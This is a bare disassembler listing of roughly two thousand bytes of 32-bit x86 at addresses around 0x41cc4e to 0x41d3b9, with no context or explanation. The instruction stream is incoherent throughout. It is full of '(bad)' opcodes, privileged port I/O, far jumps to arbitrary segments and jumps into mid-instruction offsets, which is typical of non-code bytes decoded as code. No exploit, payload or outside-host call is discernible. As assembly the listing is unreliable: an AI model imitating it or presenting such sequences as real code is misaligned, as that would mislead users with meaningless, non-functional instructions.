  41cc4e:	push   ebx
  41cc4f:	(bad)  
  41cc51:	adc    eax,0xcaa3d5a7
  41cc56:	mov    al,ds:0xa050c9cc
  41cc5b:	out    0x5c,eax
  41cc5d:	aad    0x17
  41cc5f:	xchg   esi,eax
  41cc60:	pop    ds
  41cc61:	pop    ebx
  41cc62:	psllq  mm3,QWORD PTR [ebp+0x7df9153b]
  41cc69:	add    DWORD PTR [ebx-0x2e],esp
  41cc6c:	fdiv   st,st(4)
  41cc6e:	fstp   DWORD PTR [ebp-0x21]
  41cc71:	pmulhuw mm2,QWORD PTR [eax+0x508de6e]
  41cc78:	push   ebx
  41cc79:	pusha  
  41cc7a:	push   ecx
  41cc7b:	adc    BYTE PTR [ebp-0x1109e167],dh
  41cc81:	xor    eax,0x699fd01e
  41cc86:	mov    ds:0xf0675640,al
  41cc8b:	jge    0x41cc35
  41cc8d:	in     al,dx
  41cc8e:	push   edi
  41cc8f:	jmp    0xacb6:0x85aaefe9
  41cc96:	pop    edi
  41cc97:	repz (bad) 
  41cc9a:	sbb    eax,DWORD PTR [eax]
  41cc9c:	push   edi
  41cc9d:	sbb    ebp,esp
  41cc9f:	or     edi,DWORD PTR [edi+0x5f]
  41cca2:	xchg   ecx,eax
  41cca3:	rcl    DWORD PTR [esi],0x6b
  41cca6:	or     cl,al
  41cca8:	cmp    DWORD PTR [esi+ebp*4],ebx
  41ccab:	xchg   esi,eax
  41ccad:	mov    eax,ds:0x97ee29cb
  41ccb2:	or     al,BYTE PTR [ebp+0x5e875bf7]
  41ccb8:	cmp    BYTE PTR [ebp-0x46ed54c7],bl
  41ccbe:	arpl   di,bp
  41ccc0:	mov    al,0x5e
  41ccc2:	jmp    0x41cc8e
  41ccc4:	push   esp
  41ccc5:	sbb    eax,0x49d364b1
  41ccca:	or     ebp,ecx
  41cccc:	out    0x27,eax
  41ccce:	lods   al,BYTE PTR ds:[esi]
  41cccf:	jae    0x41cd44
  41ccd1:	mov    ds:0x72ecc2bb,al
  41ccd6:	or     ch,bh
  41ccd8:	push   edx
  41ccd9:	push   esp
  41ccda:	js     0x41ccac
  41ccdc:	sbb    cl,BYTE PTR [ecx-0x18adc96a]
  41cce2:	jp     0x41cd32
  41cce4:	mov    ebx,0x71af4967
  41cce9:	cmp    al,0x7e
  41cceb:	into   
  41ccec:	jns    0x41cd2e
  41ccee:	aam    0xfb
  41ccf0:	adc    ch,BYTE PTR [esi]
  41ccf2:	pop    eax
  41ccf3:	xchg   ebp,eax
  41ccf4:	ret    0x368a
  41ccf7:	cmp    BYTE PTR [ebx-0x6f311496],0xb2
  41ccfe:	adc    BYTE PTR [edi+0x65c800bf],dh
  41cd04:	sbb    al,0xb4
  41cd06:	lahf   
  41cd07:	in     al,dx
  41cd08:	xchg   ebp,eax
  41cd09:	es enter 0x2422,0x36
  41cd0e:	push   cs
  41cd0f:	pusha  
  41cd10:	dec    edx
  41cd11:	mov    bl,0x25
  41cd13:	test   DWORD PTR [ebx-0x337299f5],0x43bb6ff
  41cd1d:	ds fwait
  41cd1f:	shr    DWORD PTR [ebx+ebx*2+0x72],cl
  41cd23:	push   edi
  41cd24:	add    ecx,ecx
  41cd26:	out    0x5e,eax
  41cd28:	adc    dl,BYTE PTR [ecx+0x33]
  41cd2b:	dec    ebp
  41cd2c:	push   ebx
  41cd2d:	xor    al,0xd6
  41cd2f:	sbb    DWORD PTR [ebx-0x41],esp
  41cd32:	and    eax,0xc43db683
  41cd37:	outs   dx,BYTE PTR ds:[esi]
  41cd38:	lods   al,BYTE PTR ds:[esi]
  41cd39:	je     0x41cd39
  41cd3b:	pop    ds
  41cd3c:	mov    esp,0xb127a160
  41cd41:	add    esp,esi
  41cd43:	in     al,0xb4
  41cd45:	sar    dh,0x47
  41cd48:	mov    ah,0x32
  41cd4a:	lods   al,BYTE PTR ss:[esi]
  41cd4c:	fstp   TBYTE PTR [ebp-0x1ff026d5]
  41cd52:	adc    ah,BYTE PTR [eax+0x4a56bdec]
  41cd58:	(bad)  
  41cd59:	jb     0x41cdce
  41cd5b:	imul   ebp,edx,0xffffffbe
  41cd5e:	sbb    eax,0x295f7a7f
  41cd63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd64:	dec    edx
  41cd65:	add    ebx,DWORD PTR [esi-0x6e643f1a]
  41cd6b:	xor    eax,0x39cdf90c
  41cd70:	pop    ecx
  41cd71:	jge    0x41cd58
  41cd73:	mov    eax,ds:0x4cf536f4
  41cd78:	test   BYTE PTR [ecx+0x3992416e],dh
  41cd7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd7f:	ficomp WORD PTR [ebx]
  41cd81:	inc    esi
  41cd82:	hlt    
  41cd83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd84:	jp     0x41cdb7
  41cd86:	xlat   BYTE PTR ds:[ebx]
  41cd87:	push   ecx
  41cd88:	call   0x760a843a
  41cd8d:	pop    edx
  41cd8e:	xor    al,0x20
  41cd90:	fstp   TBYTE PTR [edx-0x58c9ae15]
  41cd96:	outs   dx,BYTE PTR ds:[esi]
  41cd97:	inc    esi
  41cd98:	das    
  41cd99:	lds    ebp,FWORD PTR [eax]
  41cd9b:	add    al,0x68
  41cd9d:	mov    ebx,0x6ef6eb58
  41cda2:	cmp    BYTE PTR [esi],bh
  41cda4:	jno    0x41cd8f
  41cda6:	es out dx,eax
  41cda8:	stos   BYTE PTR es:[edi],al
  41cda9:	sahf   
  41cdaa:	iret   
  41cdab:	or     eax,0x6e40bc5a
  41cdb0:	mov    esp,0xf4ea6cb1
  41cdb5:	frstor [ecx+0x3abd761d]
  41cdbb:	mov    bh,0x7b
  41cdbd:	adc    al,0x86
  41cdbf:	sub    BYTE PTR [ecx],ah
  41cdc1:	sahf   
  41cdc2:	retf   0x767d
  41cdc5:	cdq    
  41cdc6:	leave  
  41cdc7:	push   ds
  41cdc8:	dec    edx
  41cdc9:	xchg   DWORD PTR [edx-0x46],ebx
  41cdcc:	ror    DWORD PTR [edx],1
  41cdce:	pop    esi
  41cdcf:	mov    ecx,0xd885ce67
  41cdd4:	mov    dh,0x43
  41cdd6:	xlat   BYTE PTR ds:[ebx]
  41cdd7:	shl    BYTE PTR [ebx-0x4f],0x5f
  41cddb:	into   
  41cddc:	es (bad) 
  41cdde:	xchg   ebp,eax
  41cddf:	bound  esp,QWORD PTR [esi+eiz*2]
  41cde2:	shl    DWORD PTR [ecx-0x1f],1
  41cde5:	cwde   
  41cde6:	rcr    BYTE PTR [ecx+0x5b578c69],cl
  41cdec:	dec    ebx
  41cded:	adc    al,0x80
  41cdef:	mov    al,BYTE PTR [ecx]
  41cdf1:	and    BYTE PTR [edi],dl
  41cdf3:	cmp    DWORD PTR ds:0x8998b462,ecx
  41cdf9:	js     0x41ce5a
  41cdfb:	and    eax,0xaf1b6692
  41ce00:	push   esi
  41ce01:	or     BYTE PTR [esi-0x7e],dh
  41ce04:	jp     0x41ce77
  41ce06:	adc    eax,0x37f7f6f4
  41ce0b:	sub    DWORD PTR [ecx],ebp
  41ce0d:	ret    
  41ce0e:	pop    esp
  41ce0f:	inc    ecx
  41ce10:	int3   
  41ce11:	or     al,0x2b
  41ce13:	in     al,dx
  41ce14:	mov    ebp,0x19d48cac
  41ce19:	mov    esi,0x11f643fc
  41ce1e:	popa   
  41ce1f:	push   ds
  41ce20:	pop    esp
  41ce21:	movups xmm4,XMMWORD PTR [ebx-0x55]
  41ce25:	arpl   WORD PTR [ebp-0x351197a],bp
  41ce2b:	ins    BYTE PTR es:[edi],dx
  41ce2c:	dec    ebx
  41ce2d:	test   al,0x89
  41ce2f:	(bad)  
  41ce30:	sbb    ch,ch
  41ce32:	jbe    0x41cdd2
  41ce34:	and    ah,ch
  41ce36:	push   cs
  41ce37:	addr16 adc al,ch
  41ce3a:	aas    
  41ce3b:	int3   
  41ce3c:	or     eax,0xdd54f1ae
  41ce41:	mov    dh,0xb9
  41ce43:	out    dx,al
  41ce44:	loopne 0x41ce3b
  41ce46:	inc    edi
  41ce47:	div    dl
  41ce49:	(bad)  
  41ce4a:	rcr    BYTE PTR [esp+esi*4+0x648f5e8],1
  41ce51:	sti    
  41ce52:	sbb    BYTE PTR [esi-0xb],0x11
  41ce56:	jnp    0x41cde9
  41ce58:	mov    edx,0x63e37df
  41ce5d:	ret    0x3af7
  41ce60:	dec    eax
  41ce61:	dec    esi
  41ce62:	adc    BYTE PTR [ebp-0x27],dh
  41ce65:	or     esi,DWORD PTR [eax+0x72]
  41ce68:	xor    al,BYTE PTR [ebp-0x644bc4db]
  41ce6e:	fild   DWORD PTR [ecx+0x79]
  41ce71:	jo     0x41ce1b
  41ce73:	out    0x12,al
  41ce75:	dec    esp
  41ce76:	mov    esi,0xd9935126
  41ce7b:	xchg   dh,ch
  41ce7d:	adc    al,0xe3
  41ce7f:	sub    bh,bl
  41ce81:	mov    cl,0x39
  41ce83:	sub    DWORD PTR [bx],0xa35dafc4
  41ce8a:	inc    eax
  41ce8b:	fldcw  WORD PTR ds:[ecx]
  41ce8e:	mov    cl,0x88
  41ce90:	xchg   ebx,eax
  41ce91:	push   cs
  41ce92:	mov    ecx,0xe278b19e
  41ce97:	xchg   ebx,eax
  41ce98:	mov    ebx,0x927c27f3
  41ce9d:	sub    BYTE PTR [ecx+0x58],0x3d
  41cea1:	mov    esp,0xf5ab20f8
  41cea6:	sar    DWORD PTR [ebx+eiz*1],cl
  41cea9:	imul   ebx,ecx,0x76
  41ceac:	xchg   ecx,eax
  41cead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceae:	xor    al,0x57
  41ceb0:	ret    
  41ceb1:	jbe    0x41ce59
  41ceb3:	(bad)  
  41ceb4:	pushf  
  41ceb5:	mov    bl,0x15
  41ceb7:	push   edx
  41ceb8:	inc    ebp
  41ceb9:	xchg   ebx,eax
  41ceba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cebb:	jmp    0x68be3aae
  41cec0:	sub    BYTE PTR [esi-0x1a40ce59],ch
  41cec6:	pop    esi
  41cec7:	jmp    0xb95d9742
  41cecc:	fisub  DWORD PTR [ebx+0x1720b429]
  41ced2:	loop   0x41cefa
  41ced4:	sub    bh,dh
  41ced6:	dec    ebp
  41ced7:	sub    BYTE PTR fs:[eax+0x3832749c],bh
  41cede:	and    eax,0xb0972c57
  41cee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cee4:	pop    esp
  41cee5:	cli    
  41cee6:	xchg   edx,eax
  41cee7:	mov    edx,0xc7e82c82
  41ceec:	popf   
  41ceed:	je     0x41cf5c
  41ceef:	pop    es
  41cef0:	mov    esi,0xa4f7801
  41cef5:	fs add eax,0xbba22dd5
  41cefb:	mov    WORD PTR [esp+esi*4-0x83497c7],ss
  41cf02:	jb     0x41cedb
  41cf04:	cmp    DWORD PTR [ecx],eax
  41cf06:	add    BYTE PTR [ebp-0x2e],0x97
  41cf0a:	retf   
  41cf0b:	xor    eax,0x36d7f94b
  41cf10:	inc    ebp
  41cf11:	clc    
  41cf12:	mov    bh,0xfa
  41cf14:	sti    
  41cf15:	fcomip st,st(6)
  41cf17:	ret    0xfd55
  41cf1a:	(bad)  
  41cf1b:	jno    0x41cee6
  41cf1d:	leave  
  41cf1e:	inc    ebx
  41cf1f:	imul   edi,DWORD PTR [esi-0x1f90e4c8],0xd19cb629
  41cf29:	xor    eax,0x6a379ab2
  41cf2e:	out    dx,al
  41cf2f:	pusha  
  41cf30:	jbe    0x41cf5b
  41cf32:	rcr    cl,cl
  41cf34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf35:	fisttp DWORD PTR [esi]
  41cf37:	dec    ebp
  41cf38:	cld    
  41cf39:	ja     0x41cf0e
  41cf3b:	int3   
  41cf3c:	dec    edx
  41cf3d:	(bad)  
  41cf3e:	cmp    al,0x5b
  41cf40:	sbb    eax,0x13b203f
  41cf45:	out    0xe2,eax
  41cf47:	lock call 0xbafcdf16
  41cf4d:	aas    
  41cf4e:	stos   BYTE PTR es:[edi],al
  41cf4f:	xor    DWORD PTR [edi],0xffffff8b
  41cf52:	jmp    0x41cf1c
  41cf54:	call   0xec7:0x4a858292
  41cf5b:	mov    ah,0x87
  41cf5d:	inc    eax
  41cf5e:	repz pusha 
  41cf60:	xor    eax,0x1dd8965b
  41cf65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf66:	ds enter 0xb26f,0x74
  41cf6b:	sub    esp,DWORD PTR [edx]
  41cf6d:	loope  0x41cefd
  41cf6f:	pop    ebx
  41cf70:	and    bl,BYTE PTR [ebp+eax*2+0x40]
  41cf74:	hlt    
  41cf75:	sub    bl,BYTE PTR [ecx]
  41cf77:	adc    eax,0x836fa27c
  41cf7c:	mov    bl,0xa0
  41cf7e:	dec    esi
  41cf7f:	dec    esp
  41cf80:	and    BYTE PTR [ebp-0x25],0x9e
  41cf84:	mov    edi,0x4796b687
  41cf89:	lods   al,BYTE PTR ds:[esi]
  41cf8a:	cli    
  41cf8b:	lea    edx,[eax]
  41cf8d:	adc    esi,DWORD PTR [ebx+0x37]
  41cf90:	cmp    eax,0xad48da0d
  41cf95:	mov    cl,cl
  41cf97:	xor    DWORD PTR [esi-0x3ed85b8d],0xffffffc6
  41cf9e:	pop    ebp
  41cf9f:	into   
  41cfa0:	je     0x41cfd3
  41cfa2:	or     BYTE PTR [ecx+esi*1],bh
  41cfa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfa6:	jmp    0x6f8b:0xaf764e77
  41cfad:	fwait
  41cfae:	cmp    ah,ch
  41cfb0:	xor    DWORD PTR ds:0x5cd8c944,esp
  41cfb6:	pusha  
  41cfb7:	cmp    cl,ah
  41cfb9:	pop    esp
  41cfba:	fbstp  TBYTE PTR [edi-0x515f8d06]
  41cfc0:	sti    
  41cfc1:	jo     0x41d023
  41cfc3:	ret    
  41cfc4:	sub    ch,BYTE PTR [ecx-0x6d]
  41cfc7:	addr16 mov dl,0x48
  41cfca:	dec    edx
  41cfcb:	lods   eax,DWORD PTR ds:[esi]
  41cfcc:	pushf  
  41cfcd:	add    al,0x49
  41cfcf:	xchg   esi,eax
  41cfd0:	arpl   ax,bx
  41cfd2:	pop    ds
  41cfd3:	inc    ecx
  41cfd4:	xlat   BYTE PTR ds:[ebx]
  41cfd5:	retf   
  41cfd6:	fcmovne st,st(4)
  41cfd8:	add    ebx,esi
  41cfda:	jo     0x41d05b
  41cfdc:	or     DWORD PTR [ebx],ebx
  41cfde:	inc    ebp
  41cfdf:	lea    esi,[ecx+0x3]
  41cfe2:	jne    0x41d032
  41cfe4:	sahf   
  41cfe5:	not    ch
  41cfe7:	add    DWORD PTR [edx+eax*8+0x660f2523],ecx
  41cfee:	(bad)  
  41cff0:	stos   DWORD PTR es:[edi],eax
  41cff1:	dec    ebp
  41cff2:	lock call 0x78a35b74
  41cff8:	add    bl,BYTE PTR [edx-0x25a66a60]
  41cffe:	mov    al,ds:0x5532cfd3
  41d003:	out    0xa6,eax
  41d005:	sub    bl,cl
  41d007:	mov    WORD PTR [ebx],ds
  41d009:	fist   DWORD PTR [ebx-0x43]
  41d00c:	xor    eax,DWORD PTR [eax]
  41d00e:	inc    ebp
  41d00f:	rol    BYTE PTR [edi],0x48
  41d012:	xor    ch,BYTE PTR [ebx]
  41d014:	aad    0x9c
  41d016:	or     DWORD PTR [ecx+eiz*2-0x402ef4f0],ecx
  41d01d:	pop    ebx
  41d01e:	jo     0x41cfde
  41d020:	fnstcw WORD PTR [ecx+0x63]
  41d023:	inc    edx
  41d024:	sar    DWORD PTR [eax],1
  41d026:	imul   ebp,DWORD PTR [esi-0x14],0x71da03b
  41d02d:	jno    0x41d0ad
  41d02f:	sub    BYTE PTR [edx-0x11ae53e],bh
  41d035:	lahf   
  41d036:	in     al,dx
  41d037:	push   ecx
  41d038:	leave  
  41d039:	lods   al,BYTE PTR ds:[esi]
  41d03a:	mov    ebx,0x86240685
  41d03f:	data16 sub BYTE PTR [edi-0x2cf24ab6],dl
  41d046:	fldcw  WORD PTR [eax+0x593cdf45]
  41d04c:	jmp    0xf69add84
  41d051:	ds je  0x41d093
  41d054:	test   DWORD PTR [esi],0x15b0ed4f
  41d05a:	mov    esp,0x2b7f6a08
  41d05f:	dec    edx
  41d060:	sub    al,0xc1
  41d062:	mov    bl,0xf0
  41d064:	sub    eax,0xbe47a337
  41d069:	leave  
  41d06a:	and    BYTE PTR ds:0x676b9df6,cl
  41d070:	mov    edi,0xb1131017
  41d075:	cs xor al,0x27
  41d078:	cmp    edx,DWORD PTR [ecx+ecx*4+0x383a62f7]
  41d07f:	cld    
  41d080:	xchg   edx,eax
  41d081:	push   edi
  41d082:	fwait
  41d083:	jbe    0x41d037
  41d085:	inc    eax
  41d086:	(bad)  
  41d088:	inc    edx
  41d089:	inc    BYTE PTR [esp+eax*4+0x67]
  41d08d:	(bad)  
  41d08e:	xor    BYTE PTR [esi-0x5c],bl
  41d091:	inc    edi
  41d092:	jbe    0x41d0f6
  41d094:	out    0xa3,al
  41d096:	push   cs
  41d097:	xor    bh,BYTE PTR [edi]
  41d099:	jmp    FWORD PTR es:[esp+edx*2+0x428ce888]
  41d0a1:	in     eax,dx
  41d0a2:	mov    al,0x68
  41d0a4:	xchg   esp,eax
  41d0a5:	call   0xae79f419
  41d0aa:	in     eax,dx
  41d0ab:	aaa    
  41d0ac:	out    0xf0,eax
  41d0ae:	ja     0x41d064
  41d0b0:	dec    eax
  41d0b1:	mov    ch,0x41
  41d0b3:	mov    ds:0xac6b05ba,al
  41d0b8:	mov    ebp,0xe1eadeb6
  41d0bd:	scas   eax,DWORD PTR es:[edi]
  41d0be:	push   eax
  41d0bf:	into   
  41d0c0:	dec    esi
  41d0c1:	xchg   edi,eax
  41d0c2:	xchg   ecx,eax
  41d0c3:	fild   QWORD PTR [edi-0x45f04c8f]
  41d0c9:	mov    dh,0x20
  41d0cb:	dec    esp
  41d0cc:	xchg   esp,eax
  41d0cd:	mov    esi,0x583f56a
  41d0d2:	loop   0x41d08c
  41d0d4:	icebp  
  41d0d5:	mov    ecx,DWORD PTR [ecx+ebx*4+0x3c08d883]
  41d0dc:	in     eax,dx
  41d0dd:	retf   0x8e1b
  41d0e0:	jbe    0x41d10e
  41d0e2:	add    eax,0x2237af36
  41d0e7:	retf   0x823d
  41d0ea:	loop   0x41d0ca
  41d0ec:	mov    WORD PTR [edx],ds
  41d0ee:	mov    gs,esi
  41d0f0:	int3   
  41d0f1:	jne    0x41d08d
  41d0f3:	fdiv   DWORD PTR [ecx]
  41d0f5:	xor    al,0x88
  41d0f7:	fs sahf 
  41d0f9:	stos   BYTE PTR es:[edi],al
  41d0fa:	test   BYTE PTR [ecx-0x1f1b21b2],bh
  41d100:	ret    
  41d101:	enter  0xa9dd,0xc2
  41d105:	push   ebx
  41d106:	mov    ds:0xfd95af59,al
  41d10b:	jmp    0x8c9289d8
  41d110:	pusha  
  41d111:	mov    ch,BYTE PTR [ecx]
  41d113:	jne    0x41d0f2
  41d115:	inc    esi
  41d116:	dec    esp
  41d117:	xchg   ebx,eax
  41d118:	fild   DWORD PTR [eax+0x1ec1f74c]
  41d11e:	add    BYTE PTR [edi-0x58e3adc9],ch
  41d124:	retf   0x44e4
  41d127:	dec    edi
  41d128:	push   ecx
  41d129:	test   bp,sp
  41d12c:	jno    0x41d194
  41d12e:	jmp    0xc865a6f6
  41d133:	mov    bl,0x11
  41d135:	popa   
  41d136:	dec    esi
  41d137:	adc    eax,0x2f47d775
  41d13c:	out    dx,eax
  41d13d:	push   ds
  41d13e:	xchg   DWORD PTR [ebx],ecx
  41d140:	push   esi
  41d141:	icebp  
  41d142:	out    0xf1,al
  41d144:	and    BYTE PTR [ecx-0xde44e3c],cl
  41d14a:	ja     0x41d1ae
  41d14c:	lods   eax,DWORD PTR ds:[esi]
  41d14d:	stc    
  41d14e:	xchg   ecx,eax
  41d14f:	xor    ebp,ecx
  41d151:	mov    ch,BYTE PTR [esi]
  41d153:	popw   es
  41d155:	and    eax,DWORD PTR [edx-0x12]
  41d158:	cdq    
  41d159:	stc    
  41d15a:	lods   eax,DWORD PTR ds:[esi]
  41d15b:	mov    dh,0x3d
  41d15d:	dec    ecx
  41d15e:	add    BYTE PTR [ebp-0x5],cl
  41d161:	push   0x7c
  41d163:	and    DWORD PTR [esi-0x42],esi
  41d166:	mov    ch,dh
  41d168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d169:	add    edi,ebp
  41d16b:	push   0x39587427
  41d170:	or     esi,DWORD PTR [esi+edi*2+0x318b58a1]
  41d177:	scas   al,BYTE PTR es:[edi]
  41d178:	mov    DWORD PTR [eax+0x1afafd4f],0x73c4cc85
  41d182:	xchg   ebx,eax
  41d183:	cmp    al,BYTE PTR [ebx]
  41d185:	(bad)  
  41d186:	push   0x9ef66445
  41d18b:	jno    0x41d1a8
  41d18d:	test   edx,eax
  41d18f:	nop
  41d190:	nop
  41d191:	fdivp  st(4),st
  41d193:	or     DWORD PTR [eax+edx*2-0x74],ebp
  41d197:	xor    BYTE PTR fs:[eax+ebp*1+0x23b1261c],al
  41d19f:	inc    ebx
  41d1a0:	xor    edx,DWORD PTR [edx+0x6b]
  41d1a3:	pop    ds
  41d1a4:	imul   ecx,DWORD PTR [ebx+ebp*1+0x6c],0x74
  41d1a9:	fdiv   DWORD PTR [ecx]
  41d1ab:	sub    DWORD PTR [ecx],edx
  41d1ad:	cmp    al,0x6e
  41d1af:	out    dx,eax
  41d1b0:	jp     0x41d14b
  41d1b2:	retf   
  41d1b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1b5:	xlat   BYTE PTR ds:[ebx]
  41d1b6:	sbb    bl,BYTE PTR [esp+edi*2]
  41d1b9:	lea    esp,[eax+0x5e752642]
  41d1bf:	inc    ebp
  41d1c0:	push   es
  41d1c1:	inc    esi
  41d1c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1c3:	xor    BYTE PTR [ebx-0x2f52147c],al
  41d1c9:	and    al,0xd
  41d1cb:	clc    
  41d1cc:	add    al,BYTE PTR [ecx]
  41d1ce:	(bad)  
  41d1cf:	into   
  41d1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1d1:	daa    
  41d1d2:	bound  ebp,QWORD PTR [edi-0x30]
  41d1d5:	ret    
  41d1d6:	call   0xcee0:0x3cfc9b9e
  41d1dd:	bound  ebp,QWORD PTR [ebx+0x12ef70e5]
  41d1e3:	push   esi
  41d1e4:	mov    al,BYTE PTR [ecx-0x60]
  41d1e7:	cs popf 
  41d1e9:	dec    ebp
  41d1ea:	out    0x86,eax
  41d1ec:	lds    ebp,FWORD PTR [esi+0x59]
  41d1ef:	dec    eax
  41d1f0:	pop    ecx
  41d1f1:	pushf  
  41d1f2:	loop   0x41d21b
  41d1f4:	jmp    DWORD PTR [ebp-0x29]
  41d1f7:	shl    ebp,1
  41d1f9:	jl     0x41d214
  41d1fb:	mov    ecx,0x9670cec5
  41d200:	cs (bad) 
  41d202:	and    DWORD PTR [ebx+ebp*8-0x262d8ca],ebx
  41d209:	cs adc edi,ecx
  41d20c:	jmp    0xa599:0x71a1aed7
  41d213:	sub    DWORD PTR [ebx-0x7c2ec381],ebp
  41d219:	cmp    al,0xb0
  41d21b:	je     0x41d1e6
  41d21d:	(bad)  [edx-0x5262abe4]
  41d223:	aad    0x60
  41d225:	test   BYTE PTR [ecx+0x35],dh
  41d228:	sbb    DWORD PTR [ebx+0x67],eax
  41d22b:	and    bl,BYTE PTR [edx+0x21]
  41d22e:	mov    ebx,0x8813316
  41d233:	mov    dl,0xd8
  41d235:	xchg   ecx,eax
  41d236:	sbb    cl,BYTE PTR [ebx+0x4f937e20]
  41d23c:	push   0xffffff92
  41d23e:	rcl    BYTE PTR [esi],0x7d
  41d241:	int3   
  41d242:	jmp    0xdd43:0xb751e2ba
  41d249:	out    0x4b,al
  41d24b:	adc    bl,bl
  41d24d:	mov    ds:0xe2d4933f,al
  41d252:	mov    BYTE PTR [ebp+0x97a34f],ah
  41d258:	mov    al,0x83
  41d25a:	cs push edx
  41d25c:	jge    0x41d207
  41d25e:	add    bl,bh
  41d260:	xchg   ebx,eax
  41d261:	cmp    ebp,DWORD PTR [edx+0x6c]
  41d264:	imul   edi,DWORD PTR [esi],0xebc0a900
  41d26a:	inc    edi
  41d26b:	jecxz  0x41d24d
  41d26d:	sar    BYTE PTR [ebx+ebp*1+0x7],0x5e
  41d272:	xor    edx,ebp
  41d274:	dec    ecx
  41d275:	dec    ecx
  41d276:	and    al,0x58
  41d278:	sub    eax,0x76b2ae90
  41d27d:	xor    al,0x44
  41d27f:	nop
  41d280:	scas   eax,DWORD PTR es:[edi]
  41d281:	dec    ebx
  41d282:	push   ds
  41d283:	push   0x39626a02
  41d288:	stos   DWORD PTR es:[edi],eax
  41d289:	dec    sp
  41d28b:	sahf   
  41d28c:	dec    edx
  41d28d:	repnz sub BYTE PTR [edx+0x5e],0xa7
  41d292:	clc    
  41d293:	jmp    0xa750b725
  41d298:	push   ebx
  41d299:	pop    ss
  41d29a:	pop    ebx
  41d29b:	lods   al,BYTE PTR ds:[esi]
  41d29c:	(bad)  
  41d29d:	mov    ebx,0xd98e6d0d
  41d2a2:	mov    eax,0x8a967bc
  41d2a7:	lds    ecx,FWORD PTR es:[esi]
  41d2aa:	xchg   DWORD PTR [edx+0x57],ebp
  41d2ad:	jmp    0x41d2ab
  41d2af:	and    eax,0x475e78cf
  41d2b4:	jge    0x41d30b
  41d2b6:	inc    edx
  41d2b7:	mov    WORD PTR [ebp+edx*2+0x5ec228e5],?
  41d2be:	push   cs
  41d2bf:	cmp    edx,edi
  41d2c1:	sub    edx,ebx
  41d2c3:	dec    BYTE PTR [eax-0x61346c2c]
  41d2c9:	ds add bl,bh
  41d2cc:	fwait
  41d2cd:	push   ss
  41d2ce:	test   bl,dh
  41d2d0:	jns    0x41d272
  41d2d2:	and    al,0x48
  41d2d4:	xchg   bh,ch
  41d2d6:	aad    0x7
  41d2d8:	pop    ebp
  41d2d9:	retf   
  41d2da:	push   esp
  41d2db:	les    ecx,FWORD PTR [esi-0x753ee62a]
  41d2e1:	and    BYTE PTR [edx+eax*8],bl
  41d2e4:	adc    bh,BYTE PTR [edx]
  41d2e6:	jo     0x41d2cd
  41d2e8:	jbe    0x41d34e
  41d2ea:	pop    esi
  41d2eb:	cmc    
  41d2ec:	cmp    DWORD PTR [edx],0x25
  41d2ef:	mov    cl,0x32
  41d2f1:	cdq    
  41d2f2:	fdiv   QWORD PTR [ebp+0x30]
  41d2f5:	sar    DWORD PTR [edx],0x33
  41d2f8:	xchg   esp,eax
  41d2f9:	data16 cmp bl,dl
  41d2fc:	xchg   edx,eax
  41d2fd:	div    DWORD PTR [edx+0x24382382]
  41d303:	jge    0x41d321
  41d305:	test   eax,0x7fbbe4f1
  41d30a:	or     DWORD PTR [ecx+0x49d3eb92],esi
  41d310:	sub    eax,0x3cb9660c
  41d315:	test   eax,0xb6fcb93d
  41d31a:	cmp    al,0x14
  41d31c:	xchg   BYTE PTR [edx+0x1d33d41c],dh
  41d322:	mov    edx,0xccc51a19
  41d327:	lock stc 
  41d329:	push   ebp
  41d32a:	pop    ecx
  41d32b:	sbb    ebp,DWORD PTR [eax]
  41d32d:	imul   eax,DWORD PTR [ecx-0x3654e1e2],0x1e7fc25e
  41d337:	mov    bl,0xab
  41d339:	out    0xda,al
  41d33b:	dec    ecx
  41d33c:	jo     0x41d300
  41d33e:	mov    ebx,DWORD PTR [esi]
  41d340:	in     al,0x42
  41d342:	push   cs
  41d343:	cmp    eax,DWORD PTR ds:0xca844135
  41d349:	lods   eax,DWORD PTR ds:[esi]
  41d34a:	call   0xc3c335e7
  41d34f:	jbe    0x41d398
  41d351:	and    eax,0x4225f911
  41d356:	mul    DWORD PTR [edi-0x65]
  41d359:	cmp    BYTE PTR [ecx],dh
  41d35b:	or     al,al
  41d35d:	mov    ch,ch
  41d35f:	test   dl,cl
  41d361:	mov    cl,0xaa
  41d363:	jbe    0x41d367
  41d365:	xchg   esi,eax
  41d366:	mov    ebx,0xf9a0cd99
  41d36b:	add    edx,DWORD PTR [esi]
  41d36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d36e:	(bad)  
  41d36f:	jmp    0x89d7759
  41d374:	inc    edi
  41d375:	pop    edi
  41d376:	das    
  41d377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d378:	inc    ebp
  41d379:	stos   DWORD PTR es:[edi],eax
  41d37a:	jecxz  0x41d3a3
  41d37c:	(bad)  
  41d37d:	cli    
  41d37e:	imul   edx,DWORD PTR [esi],0x7d5146ec
  41d384:	pop    ebx
  41d385:	add    dl,bl
  41d387:	aaa    
  41d388:	pusha  
  41d389:	daa    
  41d38a:	jmp    0x158e5356
  41d38f:	cwde   
  41d390:	pop    edi
  41d391:	dec    esi
  41d392:	stos   BYTE PTR es:[edi],al
  41d393:	cmp    al,0x6a
  41d395:	and    ebp,DWORD PTR [ebp+esi*1+0x30251409]
  41d39c:	test   DWORD PTR [ebx+0x37bf8f70],ebp
  41d3a2:	shr    BYTE PTR [eax-0x45],0xfb
  41d3a6:	inc    ebp
  41d3a7:	mov    al,0x8f
  41d3a9:	push   0x1e0019e1
  41d3ae:	xchg   esi,eax
  41d3af:	or     al,0xf
  41d3b1:	cmp    DWORD PTR [edx+0x7f75bcb3],ebp
  41d3b7:	out    0x53,eax
  41d3b9:	aad    0xc1
